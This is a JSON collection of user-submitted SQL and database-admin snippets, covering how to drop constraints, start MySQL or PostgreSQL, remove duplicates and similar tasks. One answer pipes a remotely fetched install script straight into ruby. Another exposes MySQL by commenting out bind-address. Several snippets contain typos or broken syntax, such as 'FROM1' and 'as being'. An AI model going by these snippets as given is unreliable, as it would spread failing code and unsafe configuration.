    "description": "-- find everyone with  first_name contains d case insensitive manner Make everthing either lower or upper case  SELECT FIRST_NAME , LAST_NAME  FROM EMPLOYEES  WHERE LOWER(FIRST_NAME) LIKE '%d%' ; \n",
    "reg_date": "2021-10-12T09:56:00.000Z"
  },
  {
    "id": 1433,
    "keyword": null,
    "link": null,
    "title": " how to make insert script from table in SQL server",
    "description": "Right-click on the database and go to Tasks > Generate Scripts. Select the tables (or objects) that you want to generate the script against. Go to Set scripting options tab and click on the Advanced button. In the General category, go to Type of data to script There are 3 options: Schema Only, Data Only, and Schema and Data. Select the appropriate option and click on OK.\n",
    "reg_date": "2021-10-12T09:56:00.000Z"
  },
  {
    "id": 1434,
    "keyword": null,
    "link": null,
    "title": " how to make multiple keys as primary in bdms",
    "description": "CREATE TABLE `Donor`(   `did` int(50) NOT NULL,   `oid` int(50) NOT NULL,   `dname` varchar(50) NOT NULL,   `dblood` varchar(50) NOT NULL,   PRIMARY KEY (`did`, `oid`) );\n",
    "reg_date": "2021-10-12T09:56:00.000Z"
  },
  {
    "id": 1435,
    "keyword": null,
    "link": null,
    "title": " how to move a column to different spot mysql",
    "description": "ALTER TABLE TableEx MODIFY COLUMN colName VARCHAR(50) AFTER colName2;\n",
    "reg_date": "2021-10-12T09:56:00.000Z"
  },
  {
    "id": 1436,
    "keyword": null,
    "link": null,
    "title": " how to move a columns location in mysql",
    "description": "ALTER TABLE table_name MODIFY password varchar(20) AFTER id\n",
    "reg_date": "2021-10-12T09:56:00.000Z"
  },
  {
    "id": 1437,
    "keyword": null,
    "link": null,
    "title": " how to open closed port mysql in ubuntu",
    "description": "sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf #hash (#) at the beginning of following line #bind-address = 127.0.0.1\n",
    "reg_date": "2021-10-12T09:56:00.000Z"
  },
  {
    "id": 1438,
    "keyword": null,
    "link": null,
    "title": " how to open database in mysql",
    "description": "use DBNAME;\n",
    "reg_date": "2021-10-12T09:56:00.000Z"
  },
  {
    "id": 1439,
    "keyword": null,
    "link": null,
    "title": " how to open mysql in docker",
    "description": "# login into mysql docker logs mysql1 2>&1 | grep GENERATED # check the automatically generated password of root user, copy it docker exec -it mysql1 mysql -u root -p # parse and press the Enter key\n",
    "reg_date": "2021-10-12T09:56:01.000Z"
  },
  {
    "id": 1440,
    "keyword": null,
    "link": null,
    "title": " how to open postgresql in mac",
    "description": "brew services start postgresqlpsql postgres\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n",
    "reg_date": "2021-10-12T09:56:01.000Z"
  },
  {
    "id": 1441,
    "keyword": null,
    "link": null,
    "title": " how to open postgresql in windows",
    "description": "pg_ctl.exe restart -D  \"C:\\Program Files\\PostgreSQL\\9.6\\data\" \nnet start postgresql-9.5 \npg_ctl.exe restart -D \"<path upto data>\" \n",
    "reg_date": "2021-10-12T09:56:01.000Z"
  },
  {
    "id": 1442,
    "keyword": null,
    "link": null,
    "title": " how to pass password mysql command line",
    "description": "ALTER USER 'root'@'localhost' IDENTIFIED BY 'New-Password';\nmysql -u user -ppassword password should not have any space with -p\nmysqladmin processlist -u root -pYOURPASSWORDHERE No space between your password and the -p  \n",
    "reg_date": "2021-10-12T09:56:01.000Z"
  },
  {
    "id": 1443,
    "keyword": null,
    "link": null,
    "title": " how to prevent application from sql injection in codeigniter",
    "description": "CodeIgniter's Active Record methods automatically escape queries for you, to prevent sql injection.  $this->db->select('*')->from('tablename')->where('var', $val1); $this->db->get(); or  $this->db->insert('tablename', array('var1'=>$val1, 'var2'=>$val2)); If you don't want to use Active Records, you can use query bindings to prevent against injection.  $sql = 'SELECT * FROM tablename WHERE var = ?'; $this->db->query($sql, array($val1)); Or for inserting you can use the insert_string() method.  $sql = $this->db->insert_string('tablename', array('var1'=>$val1, 'var2'=>$val2)); $this->db->query($sql); There is also the escape() method if you prefer to run your own queries.  $val1 = $this->db->escape($val1); $this->db->query(\"SELECT * FROM tablename WHERE var=$val1\");\n",
    "reg_date": "2021-10-12T09:56:01.000Z"
  },
  {
    "id": 1444,
    "keyword": null,
    "link": null,
    "title": " how to print a pattern in mysql",
    "description": "DECLARE @var int               -- Declare SELECT @var = 5                -- Initialization WHILE @var > 0                 -- condition BEGIN                          -- Begin PRINT replicate('* ', @var)    -- Print SET @var = @var - 1            -- decrement END                            -- END \n",
    "reg_date": "2021-10-12T09:56:01.000Z"
  },
  {
    "id": 1445,
    "keyword": null,
    "link": null,
    "title": " how to print mysql query of codeigniter query builder",
    "description": "To display the query string:  print_r($this->db->last_query());      To display the query result:  print_r($query); \n",
    "reg_date": "2021-10-12T09:56:01.000Z"
  },
  {
    "id": 1446,
    "keyword": null,
    "link": null,
    "title": " how to put 0 or 000 depending IDCustomer length in sql server",
    "description": "SELECT FORMAT(EmployeeID, '000000') FROM dbo.RequestItems WHERE ID=0 \n",
    "reg_date": "2021-10-12T09:56:01.000Z"
  },
  {
    "id": 1447,
    "keyword": null,
    "link": null,
    "title": " how to put value in variable mysql",
    "description": "-- MySQL  SET @variable_name := value;\nSET variable = (SELECT SUM(tax) FROM taxable_transactions);\n",
    "reg_date": "2021-10-12T09:56:01.000Z"
  },
  {
    "id": 1448,
    "keyword": null,
    "link": null,
    "title": " how to query without duplicate rows in sql",
    "description": "SELECT DISTINCT col1,col2... FROM table_name where Condition;\n",
    "reg_date": "2021-10-12T09:56:01.000Z"
  },
  {
    "id": 1449,
    "keyword": null,
    "link": null,
    "title": " how to relationship query two different tables in MySQL",
    "description": "create table yourTableName (    select *from yourTableName1 ) UNION (    select *from yourTableName2 );\nSELECT product_name, customer.name, date_of_sale   FROM sales, product, customer  WHERE  product.product_id = sales.product_id  AND customer.customer_id >= sales.customer_id LIMIT 0, 30\n",
    "reg_date": "2021-10-12T09:56:02.000Z"
  },
  {
    "id": 1450,
    "keyword": null,
    "link": null,
    "title": " how to remove characters from string  in mysql",
    "description": "#query  UPDATE tableName SET columnName = REPLACE(columnName, 'charactersToBeReplaced', 'charactersToBeReplacedWith');  #you can use like this UPDATE student_enroll_data SET student_name = REPLACE(student_name, '-gyg-', ''); \n",
    "reg_date": "2021-10-12T09:56:02.000Z"
  },
  {
    "id": 1451,
    "keyword": null,
    "link": null,
    "title": " how to remove default in mysql",
    "description": "ALTER TABLE \"table_name\" ALTER COLUMN \"name_column\" DROP DEFAULT;\n",
    "reg_date": "2021-10-12T09:56:02.000Z"
  },
  {
    "id": 1452,
    "keyword": null,
    "link": null,
    "title": " how to remove duplicate in sql",
    "description": "-- Oracle DELETE films WHERE rowid NOT IN (     SELECT min(rowid)     FROM films     GROUP BY title, uk_release_date );\n# Step 1: Copy distinct values to temporary table CREATE TEMPORARY TABLE tmp_user (     SELECT id, name      FROM user     GROUP BY name );  # Step 2: Remove all rows from original table DELETE FROM user;  # Step 3: Remove all rows from original table INSERT INTO user (SELECT * FROM tmp_user);  # Step 4: Remove temporary table DROP TABLE tmp_user; \n--ID should be primary key  --get duplicate records using RANK SELECT E.ID,      E.firstname,      E.lastname,      E.country,      T.rank FROM [SampleDB].[dbo].[Employee] E   INNER JOIN (  SELECT *,          RANK() OVER(PARTITION BY firstname,                                   lastname,                                   country         ORDER BY id) rank  FROM [SampleDB].[dbo].[Employee] ) T ON E.ID = t.ID;  --delete duplications DELETE E     FROM [SampleDB].[dbo].[Employee] E          INNER JOIN     (         SELECT *,                 RANK() OVER(PARTITION BY firstname,                                          lastname,                                          country                ORDER BY id) rank         FROM [SampleDB].[dbo].[Employee]     ) T ON E.ID = t.ID     WHERE rank > 1;\nDistinct: helps to remove all the duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\n",
    "reg_date": "2021-10-12T09:56:02.000Z"
  },
  {
    "id": 1453,
    "keyword": null,
    "link": null,
    "title": " how to remove foreign key constraint in sql",
    "description": "ALTER TABLE table_name DROP CONSTRAINT fk_name;\nUSE AdventureWorks2012;   GO   ALTER TABLE dbo.DocExe    DROP CONSTRAINT FK_Column_B;    GO   \n",
    "reg_date": "2021-10-12T09:56:02.000Z"
  },
  {
    "id": 1454,
    "keyword": null,
    "link": null,
    "title": " how to remove identity from a column in sql server",
    "description": "If you need to keep the data, but remove the IDENTITY column, you will need to: Create a new column. Transfer the data from the existing IDENTITY column to the new column. Drop the existing IDENTITY column. Rename the new column to the original column name. \n",
    "reg_date": "2021-10-12T09:56:02.000Z"
  },
  {
    "id": 1455,
    "keyword": null,
    "link": null,
    "title": " how to remove tables from postgresql",
    "description": "DROP TABLE IF EXISTS tablename;\n",
    "reg_date": "2021-10-12T09:56:02.000Z"
  },
  {
    "id": 1456,
    "keyword": null,
    "link": null,
    "title": " how to remove tablespace in oracle",
    "description": "DROP TABLESPACE tbs_02    INCLUDING CONTENTS AND DATAFILES; \n",
    "reg_date": "2021-10-12T09:56:02.000Z"
  },
  {
    "id": 1457,
    "keyword": null,
    "link": null,
    "title": " how to remove unique key constraint in mysql",
    "description": "ALTER TABLE tbl_name DROP INDEX index_name\nALTER TABLE mytable DROP INDEX key_Name;\nDROP INDEX index_name ON tbl_name\n",
    "reg_date": "2021-10-12T09:56:02.000Z"
  },
  {
    "id": 1458,
    "keyword": null,
    "link": null,
    "title": " how to remove unique key in mysql",
    "description": "ALTER TABLE tbl_name DROP INDEX index_name\nALTER TABLE mytable DROP INDEX key_Name;\nDROP INDEX index_name ON tbl_name\nALTER TABLE tbl_quiz_attempt_master   DROP INDEX `PRIMARY`;\n",
    "reg_date": "2021-10-12T09:56:02.000Z"
  },
  {
    "id": 1459,
    "keyword": null,
    "link": null,
    "title": " how to rename columns in sql server",
    "description": "--The following example renames the column TerritoryID in the table Sales.SalesTerritory to TerrID in the AdventureWorks database.  EXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN';\nALTER TABLE STUDENTS   RENAME TO ARTISTS;  \nEXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN'; \nALTER TABLE `db_name`.`table_name`  \tCHANGE `current_column_name` `new_column_name` datatype(size) NOT NULL COMMENT '';\n",
    "reg_date": "2021-10-12T09:56:03.000Z"
  },
  {
    "id": 1460,
    "keyword": null,
    "link": null,
    "title": " how to replace null values in sql",
    "description": "SELECT IFNULL(Price, 0) FROM Products; SELECT COALESCE(Price, 0) FROM Products; -- Oracle (extra): SELECT NVL(Price, 0) FROM Products;\n--See records where specific column is NULL SELECT * from table1 WHERE column1 ISNULL   --Update all the NULL values in the selected column UPDATE table1 SET column1 = replace_value WHERE column1 ISNULL\n",
    "reg_date": "2021-10-12T09:56:03.000Z"
  },
  {
    "id": 1461,
    "keyword": null,
    "link": null,
    "title": " how to resolve not a group by expression",
    "description": "SELECT a, b, sum(c) FROM my_table GROUP BY a;\t\t-- Error SELECT a, b, sum(c) FROM my_table GROUP BY a, b;\t-- OK, all expressions there -- CASE WHEN statement, for example: SELECT a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END AS r, sum(c)  FROM my_table GROUP BY a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END;\t\t-- No alias name (r)\n",
    "reg_date": "2021-10-12T09:56:03.000Z"
  },
  {
    "id": 1462,
    "keyword": null,
    "link": null,
    "title": " how to restart mysql in linux",
    "description": "##  mariadb ## systemctl start mariadb ## mysql  systemctl start mysqld\nsudo /etc/init.d/mysql restart\n                                     service mysqld restart \n",
    "reg_date": "2021-10-12T09:56:03.000Z"
  },
  {
    "id": 1463,
    "keyword": null,
    "link": null,
    "title": " how to retrieve data from a sql server database in c#",
    "description": " public Person SomeMethod(string fName)         {             var con = ConfigurationManager.ConnectionStrings[\"Yourconnection\"].ToString();              Person matchingPerson = new Person();             using (SqlConnection myConnection = new SqlConnection(con))             {                 string oString = \"Select * from Employees where FirstName=@fName\";                 SqlCommand oCmd = new SqlCommand(oString, myConnection);                 oCmd.Parameters.AddWithValue(\"@Fname\", fName);                            myConnection.Open();                 using (SqlDataReader oReader = oCmd.ExecuteReader())                 {                     while (oReader.Read())                     {                             matchingPerson.firstName = oReader[\"FirstName\"].ToString();                         matchingPerson.lastName = oReader[\"LastName\"].ToString();                                            }                      myConnection.Close();                 }                            }             return matchingPerson;         }\n",
    "reg_date": "2021-10-12T09:56:03.000Z"
  },
  {
    "id": 1464,
    "keyword": null,
    "link": null,
    "title": " how to retrieve data from multiple tables in sql",
    "description": "-- b.VALUE1 is null when ID not in table2 -- LEFT OUTER JOIN is equivalent to LEFT JOIN SELECT a.ID, a.NAME, b.VALUE1 FROM1 table1 a  LEFT OUTER JOIN table2 b ON a.ID = b.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:56:03.000Z"
  },
  {
    "id": 1465,
    "keyword": null,
    "link": null,
    "title": " how to retrive the today date sql",
    "description": "select * from datetimes  where dtm >= cast((now()) as date) and dtm < cast((now() + interval 1 day) as date) ; \n",
    "reg_date": "2021-10-12T09:56:03.000Z"
  },
  {
    "id": 1466,
    "keyword": null,
    "link": null,
    "title": " how to return a dataset from stored procedure in sql server",
    "description": "CREATE PROC myproc AS  BEGIN      SELECT name FROM SYSOBJECTS END go  DECLARE @t TABLE (name varchar(100)) INSERT @t (name) exec myproc\n",
    "reg_date": "2021-10-12T09:56:03.000Z"
  },
  {
    "id": 1467,
    "keyword": null,
    "link": null,
    "title": " how to return multiple values from stored procedure in sql server",
    "description": "CREATE PROC myproc AS  BEGIN      SELECT name FROM SYSOBJECTS END go  DECLARE @t TABLE (name varchar(100)) INSERT @t (name) exec myproc\nDeclare @Phone nvarchar(30);  Declare @Fax nvarchar(30);   select @Phone = phone , @Fax = fax from customer where customerID = 1;\n",
    "reg_date": "2021-10-12T09:56:03.000Z"
  },
  {
    "id": 1468,
    "keyword": null,
    "link": null,
    "title": " how to run mysql in git bash",
    "description": "winpty mysql -u root\n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1469,
    "keyword": null,
    "link": null,
    "title": " how to run mysql on terminal mac",
    "description": "sudo sh -c 'echo /usr/local/mysql/bin > /etc/paths.d/mysql' \n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1470,
    "keyword": null,
    "link": null,
    "title": " how to run postgresql in linux",
    "description": "sudo service postgresql start # To start the postgresql service\nsudo service postgresql-9.3 start\nsudo service postgresql-9.3 initdb sudo service postgresql-9.3 start\nsudo service postgresql-9.3 initdb\n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1471,
    "keyword": null,
    "link": null,
    "title": " how to run sql query",
    "description": "/*in Sql Server (SSMS)*/ /*Hightlight the statements you would like to execute*/ /*Then click on the green play button (somtimes with the word execute) or press F5*/\nmysql -u yourUserName -p yourDatabaseName < yourFileName.sql\nsqlplus username/password@service\t-- OR sqlplus / as sysdba  SQL> SELECT * FROM dual;\n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1472,
    "keyword": null,
    "link": null,
    "title": " how to run sql script in oracle",
    "description": "sqlplus username/password@service\t-- OR sqlplus / as sysdba  SQL> SELECT sysdate FROM dual;  SQL> @C:\\Users\\folder\\script.sql -- OR  SQL> START C:\\Users\\folder\\script.sql\nC:\\upwork\\stackoverflow\\bat_sql>echo exit   | sqlplus -s scott/tiger@esmd  @C:\\upwork\\stackoverflow\\bat_sql\\sqltest.sql  SYSDATE -------- 24.01.19  Elapsed: 00:00:00.00  C:\\upwork\\stackoverflow\\bat_sql>pause\n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1473,
    "keyword": null,
    "link": null,
    "title": " how to run sql server on mac",
    "description": "alias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start' alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop' \nsudo docker pull mcr.microsoft.com/mssql/server:2019-latest \n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1474,
    "keyword": null,
    "link": null,
    "title": " how to search date in sql query",
    "description": " select * from test   where date between '03/19/2014' and '03/19/2014 23:59:59'\n select * from test   where datediff(day, date, '03/19/2014') = 0\n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1475,
    "keyword": null,
    "link": null,
    "title": " how to search table name in stored procedure in sql server",
    "description": "SELECT Name FROM sys.procedures WHERE OBJECT_DEFINITION(OBJECT_ID) LIKE '%TableNameOrWhatever%'\n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1476,
    "keyword": null,
    "link": null,
    "title": " how to see all table partition in oracle",
    "description": "SELECT * FROM ALL_TAB_PARTITIONS;\n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1477,
    "keyword": null,
    "link": null,
    "title": " how to see database in mysql command line",
    "description": "SHOW DATABASES;\nuse DBNAME;\n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1478,
    "keyword": null,
    "link": null,
    "title": " how to see procedure output in sql developer",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:56:04.000Z"
  },
  {
    "id": 1479,
    "keyword": null,
    "link": null,
    "title": " how to see the content of  tables in pgadmin",
    "description": "SELECT * FROM <table_name>;\n",
    "reg_date": "2021-10-12T09:56:05.000Z"
  },
  {
    "id": 1480,
    "keyword": null,
    "link": null,
    "title": " how to see the query of a view in mysql",
    "description": " SHOW FULL TABLES IN sys  WHERE table_type='VIEW'; \n",
    "reg_date": "2021-10-12T09:56:05.000Z"
  },
  {
    "id": 1481,
    "keyword": null,
    "link": null,
    "title": " how to see what port mysql is running on",
    "description": "mysql -u root mysql> SHOW GLOBAL VARIABLES LIKE 'PORT'; # Default port is 3306 for MySQL\n",
    "reg_date": "2021-10-12T09:56:05.000Z"
  },
  {
    "id": 1482,
    "keyword": null,
    "link": null,
    "title": " how to see which columns are indexxed mysql",
    "description": "SHOW INDEXES FROM table_name;\n",
    "reg_date": "2021-10-12T09:56:05.000Z"
  },
  {
    "id": 1483,
    "keyword": null,
    "link": null,
    "title": " how to select a column not in group by clause in oracle",
    "description": "SELECT a, b, sum(c) FROM my_table GROUP BY a;\t\t-- Error SELECT a, b, sum(c) FROM my_table GROUP BY a, b;\t-- OK, all expressions there -- CASE WHEN statement, for example: SELECT a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END AS r, sum(c)  FROM my_table GROUP BY a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END;\t\t-- No alias name (r)\n",
    "reg_date": "2021-10-12T09:56:05.000Z"
  },
  {
    "id": 1484,
    "keyword": null,
    "link": null,
    "title": " how to select a row in sql",
    "description": "select * from [tableName] limit 1\n",
    "reg_date": "2021-10-12T09:56:05.000Z"
  },
  {
    "id": 1485,
    "keyword": null,
    "link": null,
    "title": " how to select all attributes from a row if there is a certain string in it MySQL",
    "description": "SELECT column1, column2,... FROM table_name WHERE first_name = 'John' AND sales_in_year <= 50\n",
    "reg_date": "2021-10-12T09:56:05.000Z"
  },
  {
    "id": 1486,
    "keyword": null,
    "link": null,
    "title": " how to select all fieldsin a soql query",
    "description": "// This is the object for which we required data. Map<String, Schema.SObjectField> fieldMap = Opportunity.sObjectType.getDescribe().fields.getMap();    // Get all of the fields on the object Set<String> fieldNames = fieldMap.keySet();   // Build a Dynamic Query String. List<Opportunity> opps = Database.query('select ' + string.join(fieldNames, ',') + ' from Opportunity'); \nId rId = 'SomeValidSFDCId';   DescribeSObjectResult describeResult = rId.getSObjectType().getDescribe();       Map<String, Schema.SObjectField> fieldMap = describeResult.fields.getMap();    // Get all of the fields on the object Set<String> fieldNames = fieldMap.keySet();   // Build a Dynamic Query String. String soqlQuery = ' SELECT ' + string.join (fieldName, ',') + ' FROM ' + describeResult.getName() + ' Where Id =: rId';   // Need to return a generic list of sObject because we don't necessarily know exactly what the object is. List<sObject> record = Database.query(soqlQuery); \n",
    "reg_date": "2021-10-12T09:56:05.000Z"
  },
  {
    "id": 1487,
    "keyword": null,
    "link": null,
    "title": " how to select an index in oracle sql",
    "description": "SELECT  * FROM    all_indexes WHERE   table_name = 'COUNTRY'; \n",
    "reg_date": "2021-10-12T09:56:05.000Z"
  },
  {
    "id": 1488,
    "keyword": null,
    "link": null,
    "title": " how to select first row of database sql",
    "description": "-- select the first row of database table select * from company limit 1\n-- NOTE: This is for Oracle/PLSQL only  -- > EXAMPLE select *  from CONSUMERS where ROWNUM <= 1  /* -- > SYNTAX select *  from {yourTable} where ROWNUM <= {number-of-rows}  */\n",
    "reg_date": "2021-10-12T09:56:06.000Z"
  },
  {
    "id": 1489,
    "keyword": null,
    "link": null,
    "title": " how to select from mssql",
    "description": "select * from table_name\n",
    "reg_date": "2021-10-12T09:56:06.000Z"
  },
  {
    "id": 1490,
    "keyword": null,
    "link": null,
    "title": " how to select multiple columns from different tables in mysql",
    "description": "-- MySQL  -- t1 = table1 -- dt2 = column of table SELECT t1.dt2, t2.dt4, t2.dt5, t2.dt3 #get dt3 data from table2 FROM table1 t1, table2 t2 -- Doesn't need to have t1, or t2 WHERE t1.dt2 = 'asd' AND t2.dt4 = 'qax' AND t2.dt5 = 456 \n",
    "reg_date": "2021-10-12T09:56:06.000Z"
  },
  {
    "id": 1491,
    "keyword": null,
    "link": null,
    "title": " how to select only a certain date sql",
    "description": "SELECT *  FROM sales  WHERE salesDate BETWEEN '11/11/2010 00:00:00.00' AND '11/11/2010 23:59:59.999'\n",
    "reg_date": "2021-10-12T09:56:06.000Z"
  },
  {
    "id": 1492,
    "keyword": null,
    "link": null,
    "title": " how to select random rows from a table",
    "description": " Using a SAMPLE clause, we can select random rows. SELECT * FROM table_name SAMPLE(10);\n",
    "reg_date": "2021-10-12T09:56:06.000Z"
  },
  {
    "id": 1493,
    "keyword": null,
    "link": null,
    "title": " how to select random rows from table",
    "description": " Using a SAMPLE clause, we can select random rows. SELECT * FROM table_name SAMPLE(10);\n",
    "reg_date": "2021-10-12T09:56:07.000Z"
  },
  {
    "id": 1494,
    "keyword": null,
    "link": null,
    "title": " how to select two columns from table with group by one sql server",
    "description": "SELECT Name, Size, AVG( UnitPrice )    FROM Products    GROUP BY Name, Size;\n",
    "reg_date": "2021-10-12T09:56:07.000Z"
  },
  {
    "id": 1495,
    "keyword": null,
    "link": null,
    "title": " how to select unique element in sql",
    "description": "SELECT DISTINCT column1, column2, ...   FROM table_name; \nDISTINCT - select distinct * from employees; ==>    retrieves any row if it has at   least a single unique column.  - select distinct first_name from employees; ==>        retrieves unique names      from table. (removes duplicates)       - select distinct count(*) from employees;      retrieve number of unique rows      if any row has at least a single unique data.\nDISTINCT - select distinct * from employees; ==>             retrieves any row if it has at             least a single unique column. - select distinct first_name from employees; ==>                retrieves unique names               from table. (removes duplicates) - select distinct count(*) from employees;           retrieve number of unique rows           if any row has at least a single unique data.\nThis constraint ensures all values in a column are unique. Example 1 (MySQL): Adds a unique constraint to the id column when creating a new users table. CREATE TABLE users ( id int NOT NULL, name varchar(255) NOT NULL, UNIQUE (id) ); Example 2 (MySQL): Alters an existing column to add a UNIQUE constraint. ALTER TABLE users ADD UNIQUE (id);\n",
    "reg_date": "2021-10-12T09:56:07.000Z"
  },
  {
    "id": 1496,
    "keyword": null,
    "link": null,
    "title": " how to set an already made tables auto increment in mysql",
    "description": "# To Set the value of auto increment in an already existing table use: ALTER TABLE tables_name AUTO_INCREMENT=500; # Or whatever number you desire\nALTER TABLE `users` ADD `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY  ALTER TABLE `users` ADD `id` INT NOT NULL AUTO_INCREMENT UNIQUE FIRST \nALTER TABLE tbl_access ADD COLUMN `access_id` int(10) NOT NULL PRIMARY KEY AUTO_INCREMENT FIRST \n",
    "reg_date": "2021-10-12T09:56:07.000Z"
  },
  {
    "id": 1497,
    "keyword": null,
    "link": null,
    "title": " how to set default database name in sql server",
    "description": "Exec sp_defaultdb @loginame='login', @defdb='master' \n",
    "reg_date": "2021-10-12T09:56:07.000Z"
  },
  {
    "id": 1498,
    "keyword": null,
    "link": null,
    "title": " how to set foreign key in sql server",
    "description": "-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nCREATE TABLE Orders (     OrderID int NOT NULL,     OrderNumber int NOT NULL,     PersonID int,     PRIMARY KEY (OrderID),     FOREIGN KEY (PersonID) REFERENCES Persons(PersonID) );\n",
    "reg_date": "2021-10-12T09:56:08.000Z"
  },
  {
    "id": 1499,
    "keyword": null,
    "link": null,
    "title": " how to set global time zone in mysql",
    "description": "SET GLOBAL time_zone = timezone;  eg: SET GLOBAL time_zone = 'Asia/Kolkata';\n",
    "reg_date": "2021-10-12T09:56:08.000Z"
  },
  {
    "id": 1500,
    "keyword": null,
    "link": null,
    "title": " how to set up a trigger in sql",
    "description": "Create Trigger Product_Details_tr on Product_Details for Insert as being insert into Product_Details_Audit_Log(audit_ID, update_time_stamp) select Id, CURRENT_TIMESTAMP from inserted  end\nCREATE TRIGGER Product_Details_tr  BEFORE INSERT ON Product_Details  FOR EACH ROW  SET NEW.User_ID = CURRENT_USER();\n",
    "reg_date": "2021-10-12T09:56:08.000Z"
  },
  {
    "id": 1501,
    "keyword": null,
    "link": null,
    "title": " how to show all users in mysql",
    "description": "select * from mysql.user; #or for less data select user, host from mysql.user;\n//To show all data use following query select * from mysql.user; // To show user and host use following query select User,Host from mysql.user;\nSELECT User FROM mysql.user;\nmysql> select host, user, password from mysql.user; \n#display all user data select * from mysql.user; #display username and host select user, host from mysql.user;\nmysql> select * from mysql.user; \n",
    "reg_date": "2021-10-12T09:56:08.000Z"
  },
  {
    "id": 1502,
    "keyword": null,
    "link": null,
    "title": " how to show current database in mysql",
    "description": "CopySELECT database(); \n",
    "reg_date": "2021-10-12T09:56:08.000Z"
  },
  {
    "id": 1503,
    "keyword": null,
    "link": null,
    "title": " how to show index type in postgresql",
    "description": "SELECT tab.relname, cls.relname, am.amname FROM pg_index idx  JOIN pg_class cls ON cls.oid=idx.indexrelid JOIN pg_class tab ON tab.oid=idx.indrelid JOIN pg_am am ON am.oid=cls.relam; \n",
    "reg_date": "2021-10-12T09:56:08.000Z"
  },
  {
    "id": 1504,
    "keyword": null,
    "link": null,
    "title": " how to show queries for creating table in xamp",
    "description": "SHOW CREATE TABLE tablename\n",
    "reg_date": "2021-10-12T09:56:08.000Z"
  },
  {
    "id": 1505,
    "keyword": null,
    "link": null,
    "title": " how to show the whole table in sql",
    "description": "select * from table_name\n",
    "reg_date": "2021-10-12T09:56:09.000Z"
  },
  {
    "id": 1506,
    "keyword": null,
    "link": null,
    "title": " how to sort names in alphabetical order in sql",
    "description": "SELECT id,       first_name,     last_name,    FROM customer   ORDER BY last_name ASC; \n",
    "reg_date": "2021-10-12T09:56:09.000Z"
  },
  {
    "id": 1507,
    "keyword": null,
    "link": null,
    "title": " how to start my sql server on mac",
    "description": "alias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start' alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop' \n",
    "reg_date": "2021-10-12T09:56:09.000Z"
  },
  {
    "id": 1508,
    "keyword": null,
    "link": null,
    "title": " how to start mysql in terminal mac",
    "description": "sudo sh -c 'echo /usr/local/mysql/bin > /etc/paths.d/mysql' \n",
    "reg_date": "2021-10-12T09:56:09.000Z"
  },
  {
    "id": 1509,
    "keyword": null,
    "link": null,
    "title": " how to start mysql server in windows",
    "description": "net start MySQL80 \nPress CTRL+C to copy C:\\> \"C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\\mysqld\"\noption 1: Launch the MySQL Command-Line Client. To launch the client, enter the following command in a Command Prompt window: mysql -u root -p . The -p option is needed only if a root password is defined for MySQL. Enter the password when prompted.   Option 2: Start MySQL Server on Windows  On Windows, you can start the MySQL Server using the mysqld program as follows:  First, open the Run dialog by pressing Windows+R keyboards:  Second, type cmd and press Enter:  Third, type mysqld and press Enter:  mysqld  If the bin folder is not in the Windows path environment, you can navigate to the bin folder e.g., C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\\ and use the mysqld command.\n",
    "reg_date": "2021-10-12T09:56:09.000Z"
  },
  {
    "id": 1510,
    "keyword": null,
    "link": null,
    "title": " how to start mysql server in windows 10",
    "description": "net start MySQL80 \noption 1: Launch the MySQL Command-Line Client. To launch the client, enter the following command in a Command Prompt window: mysql -u root -p . The -p option is needed only if a root password is defined for MySQL. Enter the password when prompted.   Option 2: Start MySQL Server on Windows  On Windows, you can start the MySQL Server using the mysqld program as follows:  First, open the Run dialog by pressing Windows+R keyboards:  Second, type cmd and press Enter:  Third, type mysqld and press Enter:  mysqld  If the bin folder is not in the Windows path environment, you can navigate to the bin folder e.g., C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\\ and use the mysqld command.\n",
    "reg_date": "2021-10-12T09:56:09.000Z"
  },
  {
    "id": 1511,
    "keyword": null,
    "link": null,
    "title": " how to start postgresql laravel",
